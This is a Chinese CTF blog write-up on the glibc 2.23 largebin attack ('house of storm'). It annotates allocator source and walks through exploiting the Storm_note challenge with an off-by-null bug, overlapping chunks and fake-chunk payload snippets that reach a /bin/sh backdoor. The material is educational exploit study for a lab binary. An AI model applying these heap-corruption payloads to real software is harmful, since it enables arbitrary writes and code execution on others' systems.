<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    largebin_attack-glibc2.23 |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-largebin-attack-glibc2-23" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      largebin_attack-glibc2.23
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/08/01/largebin-attack-glibc2-23/" class="article-date">
  <time datetime="2020-08-01T14:16:07.000Z" itemprop="datePublished">2020-08-01</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h2 id="unsortedbin-拆分smallbin和largebin："><a href="#unsortedbin-拆分smallbin和largebin：" class="headerlink" title="unsortedbin 拆分smallbin和largebin："></a>unsortedbin 拆分smallbin和largebin：</h2><p>把largebin放入large bin list里面的话得先解链，和unlink其实差不多，不过这里用到了nextsize</p>
<p>glibc2.23   malloc/malloc.c:3470</p>
<a id="more"></a>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//遍历unsortedbin_list</span></span><br><span class="line">    &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">              <span class="comment">//chunk大小不能小于等于2*SIZE_SZ，不能超过分配区总的内存分配量</span></span><br><span class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;<span class="comment">//chunk 属于smallbin的获得相应的index，当前chunk插入到fwd和bck之间</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;<span class="comment">//largebin和上面一样</span></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;<span class="comment">//largebin中有空闲chunk</span></span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;<span class="comment">//如果当前chunk的size小于最后一个的size则插到链表最后</span></span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;<span class="comment">//正向找第一个chunk大小小于等于当前chunk</span></span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                        <span class="comment">//如果找到和当前chunk的size一样的chunk，当前chunk插入到fwd之后</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//如果当前size还没有别的chunk，则成为chunk size的代表</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//第一次任意地址写入unsorted bin chunk的地址 </span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span> </span><br><span class="line">              <span class="comment">//largebin中没有chunk，直接将chunk写入chunksize链表</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim; <span class="comment">//第二次任意地址写入unsorted bin chunk的地址</span></span><br><span class="line">          <span class="comment">//将chunk插入到largeb bin中，将large bin所对应binmap的相应bit位置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS) <span class="comment">//遍历最多10000遍</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="house-of-strom利用："><a href="#house-of-strom利用：" class="headerlink" title="house of strom利用："></a>house of strom利用：</h2><p>我们要构造unsorted bin 里面有一个large bin chunk未被分配进入large bin ，large bin 里也有一个chunk，保证unsorted bin里的那个large bin chunk的size要比large bin里已有的这个chunk的size要大一点，但是都属于同一个index。<br>（large bin 里的index分配跨度的0x3f，eg: 0x4c0-0x4ff;0x500-0x53f）</p>
<p>我们可以利用堆溢出改掉一个原本在largebin列表内的chunk的bk和bk_nextsize，指向我们的目的地址</p>
<p>bk指向的位置+0x10的位置（fd）填入当前chunk的地址，bk_nextsize指向的位置+0x20的位置（fd_nextsize）填入当前chunk地址</p>
<p>eg:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk1 : <span class="number">0x000400</span>                                addr:<span class="number">0x000818</span> : <span class="number">0x000400</span></span><br><span class="line">bk: <span class="number">0x000808</span>            -----------------&gt;            <span class="number">0x000820</span> : <span class="number">0x000400</span></span><br><span class="line">bk_nextsize:<span class="number">0x000800</span></span><br></pre></td></tr></table></figure>

<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="西湖论剑-Storm-note"><a href="#西湖论剑-Storm-note" class="headerlink" title="西湖论剑 Storm_note"></a>西湖论剑 Storm_note</h3><p><strong>漏洞</strong>：off by null<br><strong>利用</strong>：large bin attack、overlap（没有show本能是IO_FILE的，但是零字节溢出会覆盖部分地址，就打消了这个念头</p>
<p><strong>init_proc 函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0xABCD0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != <span class="number">2882338816L</span>L )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int mallopt(int param,int value) ：</span><br><span class="line">M_MXFAST:定义使用fastbins的内存请求大小的上限( param=<span class="number">1</span>，相当于被禁，即<span class="built_in">free</span>完之后不入fastbin <span class="built_in">list</span></span><br></pre></td></tr></table></figure>

<p><strong>后门函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"If you can open the lock, I will let you in"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即  输入=随机数  就能触发后门</p>
<p><strong>alloc 函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">alloc_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"size ?"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">0xFFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1u</span>LL);</span><br><span class="line">      note_size[i] = v1;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>edit 函数</strong> （off by null)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</span><br><span class="line">    v2 = read(<span class="number">0</span>, note[v1], note_size[v1]);</span><br><span class="line">    *(note[v1] + v2) = <span class="number">0</span>;  <span class="comment">//off by null</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>delete 函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(note[v1]);</span><br><span class="line">    note[v1] = <span class="number">0L</span>L;</span><br><span class="line">    note_size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">overlap：</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#此刻chunk_list里面只有chunk1的位置是空缺的</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)<span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#7 0x050  --&gt;chunk2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)    <span class="comment">#overlap  把0x18大小的chunk free掉了，空了一个位置，并且和前面堆块合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#recover</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>)<span class="comment">#2  实现chunk2和chunk7堆块重叠</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/01/largebin-attack-glibc2-23/1.png" alt></p>
<p>后面chunk8那个的实现也差不多的</p>
<p><strong>large bin attack:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">target= <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = target- <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment"># bk --&gt;构造fackchunk的fd</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/01/largebin-attack-glibc2-23/2.png" alt></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#理应写入下一个chunk的fd处，但是刚好借助位置可以写入fakechunk的bk处，防止程序crash</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#target chunk fake size  一定要0x56</span></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/01/largebin-attack-glibc2-23/3.png" alt></p>
<p>再次malloc之后，chunk7从unsorted bin到large bin chunk8的fd指向chunk7，chunk7剩余部分存入unsorted bin ，因为堆块重叠，chunk2是large bin，且早被free了，所以chunk2被存入large bin</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/4.png" alt></p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/5.png" alt></p>
